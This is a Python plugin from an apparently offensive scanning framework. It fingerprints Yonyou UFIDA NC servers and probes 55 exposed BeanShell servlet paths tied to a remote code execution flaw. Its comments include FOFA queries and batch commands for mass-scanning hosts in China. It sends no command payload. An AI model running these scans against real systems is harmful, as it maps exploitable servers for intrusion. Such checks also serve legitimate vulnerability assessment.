# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: 用友 && country="CN"
# python3 batch.py -m exploit.scripts.OA.yonyou.ufida_nc.bsh_servlet_BshServlet -cs -fs "\"用友\" && country=\"CN\""
# python3 batch.py -m exploit.scripts.OA.yonyou.ufida_nc.bsh_servlet_BshServlet -cs -fs "icon_hash=\"1085941792\""

class Script(BaseScript):
    name = 'yonyou-ufida'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ'
        # 特定路径判断
        self.detect_path_list = ['/']
        # priority
        self.priority = 1
        # exec
        self.exec_path_list = ["/service/~aim/bsh.servlet.BshServlet",
                               "/service/~alm/bsh.servlet.BshServlet",
                               "/service/~ampub/bsh.servlet.BshServlet",
                               "/service/~arap/bsh.servlet.BshServlet",
                               "/service/~aum/bsh.servlet.BshServlet",
                               "/service/~cc/bsh.servlet.BshServlet",
                               "/service/~cdm/bsh.servlet.BshServlet",
                               "/service/~cmp/bsh.servlet.BshServlet",
                               "/service/~ct/bsh.servlet.BshServlet",
                               "/service/~dm/bsh.servlet.BshServlet",
                               "/service/~erm/bsh.servlet.BshServlet",
                               "/service/~fa/bsh.servlet.BshServlet",
                               "/service/~fac/bsh.servlet.BshServlet",
                               "/service/~fbm/bsh.servlet.BshServlet",
                               "/service/~ff/bsh.servlet.BshServlet",
                               "/service/~fip/bsh.servlet.BshServlet",
                               "/service/~fipub/bsh.servlet.BshServlet",
                               "/service/~fp/bsh.servlet.BshServlet",
                               "/service/~fts/bsh.servlet.BshServlet",
                               "/service/~fvm/bsh.servlet.BshServlet",
                               "/service/~gl/bsh.servlet.BshServlet",
                               "/service/~hrhi/bsh.servlet.BshServlet",
                               "/service/~hrjf/bsh.servlet.BshServlet",
                               "/service/~hrpd/bsh.servlet.BshServlet",
                               "/service/~hrpub/bsh.servlet.BshServlet",
                               "/service/~hrtrn/bsh.servlet.BshServlet",
                               "/service/~hrwa/bsh.servlet.BshServlet",
                               "/service/~ia/bsh.servlet.BshServlet",
                               "/service/~ic/bsh.servlet.BshServlet",
                               "/service/~iufo/bsh.servlet.BshServlet",
                               "/service/~modules/bsh.servlet.BshServlet",
                               "/service/~mpp/bsh.servlet.BshServlet",
                               "/service/~obm/bsh.servlet.BshServlet",
                               "/service/~pu/bsh.servlet.BshServlet",
                               "/service/~qc/bsh.servlet.BshServlet",
                               "/service/~sc/bsh.servlet.BshServlet",
                               "/service/~scmpub/bsh.servlet.BshServlet",
                               "/service/~so/bsh.servlet.BshServlet",
                               "/service/~so2/bsh.servlet.BshServlet",
                               "/service/~so3/bsh.servlet.BshServlet",
                               "/service/~so4/bsh.servlet.BshServlet",
                               "/service/~so5/bsh.servlet.BshServlet",
                               "/service/~so6/bsh.servlet.BshServlet",
                               "/service/~tam/bsh.servlet.BshServlet",
                               "/service/~tbb/bsh.servlet.BshServlet",
                               "/service/~to/bsh.servlet.BshServlet",
                               "/service/~uap/bsh.servlet.BshServlet",
                               "/service/~uapbd/bsh.servlet.BshServlet",
                               "/service/~uapde/bsh.servlet.BshServlet",
                               "/service/~uapeai/bsh.servlet.BshServlet",
                               "/service/~uapother/bsh.servlet.BshServlet",
                               "/service/~uapqe/bsh.servlet.BshServlet",
                               "/service/~uapweb/bsh.servlet.BshServlet",
                               "/service/~uapws/bsh.servlet.BshServlet",
                               "/service/~vrm/bsh.servlet.BshServlet"]
        # 相关信息
        self.info = r'''用友-UFIDA-NC财务系统 2021年6月爆出现的 /servlet/~ic/bsh.servlet.BshServlet lib\bsh-2.0b1.jar'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers,timeout=self.req_timeout)
                if text is not None and (('ufida_iufo_over.png' in text and 'ufida_nc.png' in text) or ('logo/images/' in text and 'ufida_nc' in text) or 'logo/images/ufida_nc.png' in text or '<div id="nc_text">' in text or '''<div id="nc_img" onmouseover="overimage('nc');''' in text):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
